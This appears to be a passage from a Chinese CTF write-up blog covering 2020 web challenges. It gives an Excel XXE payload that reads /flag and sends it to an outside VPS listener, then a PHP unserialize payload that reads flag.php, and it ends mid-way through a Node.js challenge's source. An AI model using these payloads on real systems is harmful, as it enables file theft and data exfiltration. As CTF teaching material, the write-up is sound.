&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//UploadServlet.class</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">package</span> cn.abc.servlet;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.File;</span><br><span class="line"><span class="keyword">import</span> java.io.FileOutputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.IOException;</span><br><span class="line"><span class="keyword">import</span> java.io.InputStream;</span><br><span class="line"><span class="keyword">import</span> java.util.Iterator;</span><br><span class="line"><span class="keyword">import</span> java.util.List;</span><br><span class="line"><span class="keyword">import</span> java.util.UUID;</span><br><span class="line"><span class="keyword">import</span> javax.servlet.ServletException;</span><br><span class="line"><span class="keyword">import</span> javax.servlet.http.HttpServlet;</span><br><span class="line"><span class="keyword">import</span> javax.servlet.http.HttpServletRequest;</span><br><span class="line"><span class="keyword">import</span> javax.servlet.http.HttpServletResponse;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.fileupload.FileItem;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.fileupload.FileUploadException;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.fileupload.disk.DiskFileItemFactory;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.fileupload.servlet.ServletFileUpload;</span><br><span class="line"><span class="keyword">import</span> org.apache.poi.openxml4j.exceptions.InvalidFormatException;</span><br><span class="line"><span class="keyword">import</span> org.apache.poi.ss.usermodel.Sheet;</span><br><span class="line"><span class="keyword">import</span> org.apache.poi.ss.usermodel.Workbook;</span><br><span class="line"><span class="keyword">import</span> org.apache.poi.ss.usermodel.WorkbookFactory;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">UploadServlet</span> <span class="keyword">extends</span> <span class="title">HttpServlet</span> </span>&#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">final</span> <span class="keyword">long</span> serialVersionUID = <span class="number">1L</span>;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="title">UploadServlet</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">protected</span> <span class="keyword">void</span> <span class="title">doGet</span><span class="params">(HttpServletRequest request, HttpServletResponse response)</span> <span class="keyword">throws</span> ServletException, IOException </span>&#123;</span><br><span class="line">        <span class="keyword">this</span>.doPost(request, response);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">protected</span> <span class="keyword">void</span> <span class="title">doPost</span><span class="params">(HttpServletRequest request, HttpServletResponse response)</span> <span class="keyword">throws</span> ServletException, IOException </span>&#123;</span><br><span class="line">        String savePath = <span class="keyword">this</span>.getServletContext().getRealPath(<span class="string">"/WEB-INF/upload"</span>);</span><br><span class="line">        String tempPath = <span class="keyword">this</span>.getServletContext().getRealPath(<span class="string">"/WEB-INF/temp"</span>);</span><br><span class="line">        File tempFile = <span class="keyword">new</span> File(tempPath);</span><br><span class="line">        <span class="keyword">if</span> (!tempFile.exists()) &#123;</span><br><span class="line">            tempFile.mkdir();</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        String message = <span class="string">""</span>;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            DiskFileItemFactory factory = <span class="keyword">new</span> DiskFileItemFactory();</span><br><span class="line">            factory.setSizeThreshold(<span class="number">102400</span>);</span><br><span class="line">            factory.setRepository(tempFile);</span><br><span class="line">            ServletFileUpload upload = <span class="keyword">new</span> ServletFileUpload(factory);</span><br><span class="line">            upload.setHeaderEncoding(<span class="string">"UTF-8"</span>);</span><br><span class="line">            upload.setFileSizeMax(<span class="number">1048576L</span>);</span><br><span class="line">            upload.setSizeMax(<span class="number">10485760L</span>);</span><br><span class="line">            <span class="keyword">if</span> (!ServletFileUpload.isMultipartContent(request)) &#123;</span><br><span class="line">                <span class="keyword">return</span>;</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            List&lt;FileItem&gt; list = upload.parseRequest(request);</span><br><span class="line">            Iterator var10 = list.iterator();</span><br><span class="line"></span><br><span class="line">            label56:</span><br><span class="line">            <span class="keyword">while</span>(<span class="keyword">true</span>) &#123;</span><br><span class="line">                <span class="keyword">while</span>(<span class="keyword">true</span>) &#123;</span><br><span class="line">                    <span class="keyword">if</span> (!var10.hasNext()) &#123;</span><br><span class="line">                        <span class="keyword">break</span> label56;</span><br><span class="line">                    &#125;</span><br><span class="line"></span><br><span class="line">                    FileItem fileItem = (FileItem)var10.next();</span><br><span class="line">                    String filename;</span><br><span class="line">                    String fileExtName;</span><br><span class="line">                    <span class="keyword">if</span> (fileItem.isFormField()) &#123;</span><br><span class="line">                        filename = fileItem.getFieldName();</span><br><span class="line">                        fileExtName = fileItem.getString(<span class="string">"UTF-8"</span>);</span><br><span class="line">                    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                        filename = fileItem.getName();</span><br><span class="line">                        <span class="keyword">if</span> (filename != <span class="keyword">null</span> &amp;&amp; !filename.trim().equals(<span class="string">""</span>)) &#123;</span><br><span class="line">                            fileExtName = filename.substring(filename.lastIndexOf(<span class="string">"."</span>) + <span class="number">1</span>);</span><br><span class="line">                            InputStream in = fileItem.getInputStream();</span><br><span class="line">                            <span class="keyword">if</span> (filename.startsWith(<span class="string">"excel-"</span>) &amp;&amp; <span class="string">"xlsx"</span>.equals(fileExtName)) &#123;</span><br><span class="line">                                <span class="keyword">try</span> &#123;</span><br><span class="line">                                    Workbook wb1 = WorkbookFactory.create(in);</span><br><span class="line">                                    Sheet sheet = wb1.getSheetAt(<span class="number">0</span>);</span><br><span class="line">                                    System.out.println(sheet.getFirstRowNum());</span><br><span class="line">                                &#125; <span class="keyword">catch</span> (InvalidFormatException var20) &#123;</span><br><span class="line">                                    System.err.println(<span class="string">"poi-ooxml-3.10 has something wrong"</span>);</span><br><span class="line">                                    var20.printStackTrace();</span><br><span class="line">                                &#125;</span><br><span class="line">                            &#125;</span><br><span class="line"></span><br><span class="line">                            String saveFilename = <span class="keyword">this</span>.makeFileName(filename);</span><br><span class="line">                            request.setAttribute(<span class="string">"saveFilename"</span>, saveFilename);</span><br><span class="line">                            request.setAttribute(<span class="string">"filename"</span>, filename);</span><br><span class="line">                            String realSavePath = <span class="keyword">this</span>.makePath(saveFilename, savePath);</span><br><span class="line">                            FileOutputStream out = <span class="keyword">new</span> FileOutputStream(realSavePath + <span class="string">"/"</span> + saveFilename);</span><br><span class="line">                            <span class="keyword">byte</span>[] buffer = <span class="keyword">new</span> <span class="keyword">byte</span>[<span class="number">1024</span>];</span><br><span class="line">                            <span class="keyword">boolean</span> var19 = <span class="keyword">false</span>;</span><br><span class="line"></span><br><span class="line">                            <span class="keyword">int</span> len;</span><br><span class="line">                            <span class="keyword">while</span>((len = in.read(buffer)) &gt; <span class="number">0</span>) &#123;</span><br><span class="line">                                out.write(buffer, <span class="number">0</span>, len);</span><br><span class="line">                            &#125;</span><br><span class="line"></span><br><span class="line">                            in.close();</span><br><span class="line">                            out.close();</span><br><span class="line">                            message = <span class="string">"文件上传成功!"</span>;</span><br><span class="line">                        &#125;</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125; <span class="keyword">catch</span> (FileUploadException var21) &#123;</span><br><span class="line">            var21.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        request.setAttribute(<span class="string">"message"</span>, message);</span><br><span class="line">        request.getRequestDispatcher(<span class="string">"/ListFileServlet"</span>).forward(request, response);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">private</span> String <span class="title">makeFileName</span><span class="params">(String filename)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> UUID.randomUUID().toString() + <span class="string">"_"</span> + filename;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">private</span> String <span class="title">makePath</span><span class="params">(String filename, String savePath)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">int</span> hashCode = filename.hashCode();</span><br><span class="line">        <span class="keyword">int</span> dir1 = hashCode &amp; <span class="number">15</span>;</span><br><span class="line">        <span class="keyword">int</span> dir2 = (hashCode &amp; <span class="number">240</span>) &gt;&gt; <span class="number">4</span>;</span><br><span class="line">        String dir = savePath + <span class="string">"/"</span> + dir1 + <span class="string">"/"</span> + dir2;</span><br><span class="line">        File file = <span class="keyword">new</span> File(dir);</span><br><span class="line">        <span class="keyword">if</span> (!file.exists()) &#123;</span><br><span class="line">            file.mkdirs();</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> dir;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>发现关键代码</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (filename.startsWith(<span class="string">"excel-"</span>) &amp;&amp; <span class="string">"xlsx"</span>.equals(fileExtName)) &#123;</span><br><span class="line">                                <span class="keyword">try</span> &#123;</span><br><span class="line">                                    Workbook wb1 = WorkbookFactory.create(in);</span><br><span class="line">                                    Sheet sheet = wb1.getSheetAt(<span class="number">0</span>);</span><br><span class="line">                                    System.out.println(sheet.getFirstRowNum());</span><br><span class="line">                                &#125; <span class="keyword">catch</span> (InvalidFormatException var20) &#123;</span><br><span class="line">                                    System.err.println(<span class="string">"poi-ooxml-3.10 has something wrong"</span>);</span><br><span class="line">                                    var20.printStackTrace();</span><br><span class="line">                                &#125;</span><br><span class="line">                            &#125;</span><br></pre></td></tr></table></figure><p>是excel的xxe。还得数据外带</p><p>使用vps 在本地写个1文件内容为</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&lt;!ENTITY % file SYSTEM &#39;file:&#x2F;&#x2F;&#x2F;flag&#39;&gt;</span><br><span class="line">&lt;!ENTITY % payload &quot;&lt;!ENTITY &amp;#37; send SYSTEM &#39;http:&#x2F;&#x2F;ip:5555&#x2F;%file;&#39;&gt;&quot;&gt;</span><br></pre></td></tr></table></figure><p>创建一个xlsx文件，使用压缩文件打开，将里面的[Content_Types].xml解压，在第二行添加如下代码</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;!DOCTYPE any [ &lt;!ENTITY % remote SYSTEM &quot;http:&#x2F;&#x2F;174.1.62.113:5555&#x2F;1&quot;&gt;%remote;%payload;%send;]&gt;</span><br></pre></td></tr></table></figure><p>并替换压缩包内文件（<strong>不要解压</strong>，直接替换Content_Types.xml）然后在vps上在文件1所在目录执行命令启动零时web服务器</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">php -S 0.0.0.0:5555</span><br></pre></td></tr></table></figure><p>等待接受文件即可</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">root@2c51daa62fd1:~# [Mon May 11 11:40:56 2020] *.*.*.*:52204 [200]: &#x2F;1</span><br><span class="line">[Mon May 11 11:40:56 2020] *.*.*.*:52208 [404]: &#x2F;flag&#123;55ac2090-a7cb-438f-a636-2d5ea530d387&#125; - No such file or directory</span><br></pre></td></tr></table></figure><h2 id="青龙组AreUSerialz"><a href="#青龙组AreUSerialz" class="headerlink" title="青龙组AreUSerialz"></a>青龙组AreUSerialz</h2><p>打开题目就有源码</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">include</span>(<span class="string">"flag.php"</span>);</span><br><span class="line"></span><br><span class="line">highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">FileHandler</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">protected</span> $op;</span><br><span class="line">    <span class="keyword">protected</span> $filename;</span><br><span class="line">    <span class="keyword">protected</span> $content;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        $op = <span class="string">"1"</span>;</span><br><span class="line">        $filename = <span class="string">"/tmp/tmpfile"</span>;</span><br><span class="line">        $content = <span class="string">"Hello World!"</span>;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;process();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">process</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="keyword">$this</span>-&gt;op == <span class="string">"1"</span>) &#123;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;write();</span><br><span class="line">        &#125; <span class="keyword">else</span> <span class="keyword">if</span>(<span class="keyword">$this</span>-&gt;op == <span class="string">"2"</span>) &#123;</span><br><span class="line">            $res = <span class="keyword">$this</span>-&gt;read();</span><br><span class="line">            <span class="keyword">$this</span>-&gt;output($res);</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;output(<span class="string">"Bad Hacker!"</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="function"><span class="keyword">function</span> <span class="title">write</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="keyword">$this</span>-&gt;filename) &amp;&amp; <span class="keyword">isset</span>(<span class="keyword">$this</span>-&gt;content)) &#123;</span><br><span class="line">            <span class="keyword">if</span>(strlen((string)<span class="keyword">$this</span>-&gt;content) &gt; <span class="number">100</span>) &#123;</span><br><span class="line">                <span class="keyword">$this</span>-&gt;output(<span class="string">"Too long!"</span>);</span><br><span class="line">                <span class="keyword">die</span>();</span><br><span class="line">            &#125;</span><br><span class="line">            $res = file_put_contents(<span class="keyword">$this</span>-&gt;filename, <span class="keyword">$this</span>-&gt;content);</span><br><span class="line">            <span class="keyword">if</span>($res) <span class="keyword">$this</span>-&gt;output(<span class="string">"Successful!"</span>);</span><br><span class="line">            <span class="keyword">else</span> <span class="keyword">$this</span>-&gt;output(<span class="string">"Failed!"</span>);</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;output(<span class="string">"Failed!"</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="function"><span class="keyword">function</span> <span class="title">read</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        $res = <span class="string">""</span>;</span><br><span class="line">        <span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="keyword">$this</span>-&gt;filename)) &#123;</span><br><span class="line">            $res = file_get_contents(<span class="keyword">$this</span>-&gt;filename);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> $res;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="function"><span class="keyword">function</span> <span class="title">output</span><span class="params">($s)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">"[Result]: &lt;br&gt;"</span>;</span><br><span class="line">        <span class="keyword">echo</span> $s;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="keyword">$this</span>-&gt;op === <span class="string">"2"</span>)</span><br><span class="line">            <span class="keyword">$this</span>-&gt;op = <span class="string">"1"</span>;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;content = <span class="string">""</span>;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;process();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">is_valid</span><span class="params">($s)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">for</span>($i = <span class="number">0</span>; $i &lt; strlen($s); $i++)</span><br><span class="line">        <span class="keyword">if</span>(!(ord($s[$i]) &gt;= <span class="number">32</span> &amp;&amp; ord($s[$i]) &lt;= <span class="number">125</span>))</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">false</span>;</span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">true</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_GET&#123;<span class="string">'str'</span>&#125;)) &#123;</span><br><span class="line"></span><br><span class="line">    $str = (string)$_GET[<span class="string">'str'</span>];</span><br><span class="line">    <span class="keyword">if</span>(is_valid($str)) &#123;</span><br><span class="line">        $obj = unserialize($str);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>看到最后上序列化漏洞，还有过滤，只能使用ascii32-125的字符，protect序列化会有%00。之前有过<a href="">一个题目</a> 过滤了%使用<code>S</code>代替<code>s</code>，序列化字符串时<code>%00*%00</code>就回替换为<code>\00*\00</code>，在此处选择protect转换为public，将FileHandler属性内容改大</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">FileHandler</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> $op;</span><br><span class="line">    <span class="keyword">public</span> $filename;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">$a=<span class="keyword">new</span> FileHandler();</span><br><span class="line">$a-&gt;op=<span class="number">2</span>;</span><br><span class="line">$a-&gt;filename=<span class="string">'flag.php'</span>;</span><br><span class="line"><span class="keyword">echo</span> serialize($a);  <span class="comment">//O:11:"FileHandler":2:&#123;s:2:"op";i:2;s:8:"filename";s:8:"flag.php";&#125;</span></span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">payload:?str&#x3D;O:11:&quot;FileHandler&quot;:3:&#123;s:2:&quot;op&quot;;i:2;s:8:&quot;filename&quot;;s:8:&quot;flag.php&quot;;&#125;</span><br></pre></td></tr></table></figure><p>查看源码即可获得flag<br>更多解法参考<a href="https://www.gem-love.com/websecurity/2322.html" target="_blank" rel="noopener">颖齐师傅博客</a></p><h2 id="青龙组-notes"><a href="#青龙组-notes" class="headerlink" title="青龙组 notes"></a>青龙组 notes</h2><p>给出了源码</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> express = <span class="built_in">require</span>(<span class="string">'express'</span>);</span><br><span class="line"><span class="keyword">var</span> path = <span class="built_in">require</span>(<span class="string">'path'</span>);</span><br><span class="line"><span class="keyword">const</span> undefsafe = <span class="built_in">require</span>(<span class="string">'undefsafe'</span>);</span><br><span class="line"><span class="keyword">const</span> &#123; exec &#125; = <span class="built_in">require</span>(<span class="string">'child_process'</span>);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> app = express();</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Notes</span> </span>&#123;</span><br><span class="line">    <span class="keyword">constructor</span>() &#123;</span><br><span class="line">        <span class="keyword">this</span>.owner = <span class="string">"whoknows"</span>;</span><br><span class="line">        <span class="keyword">this</span>.num = <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">this</span>.note_list = &#123;&#125;;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    write_note(author, raw_note) &#123;</span><br><span class="line">        <span class="keyword">this</span>.note_list[(<span class="keyword">this</span>.num++).toString()] = &#123;<span class="string">"author"</span>: author,<span class="string">"raw_note"</span>:raw_note&#125;;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    get_note(id) &#123;</span><br><span class="line">        <span class="keyword">var</span> r = &#123;&#125;</span><br><span class="line">        undefsafe(r, id, undefsafe(<span class="keyword">this</span>.note_list, id));</span><br><span class="line">        <span class="keyword">return</span> r;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    edit_note(id, author, raw) &#123;</span><br><span class="line">        undefsafe(<span class="keyword">this</span>.note_list, id + <span class="string">'.author'</span>, author);</span><br><span class="line">        undefsafe(<span class="keyword">this</span>.note_list, id + <span class="string">'.raw_note'</span>, raw);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    get_all_notes() &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">this</span>.note_list;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    remove_note(id) &#123;</span><br><span class="line">        <span class="keyword">delete</span> <span class="keyword">this</span>.note_list[id];</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span 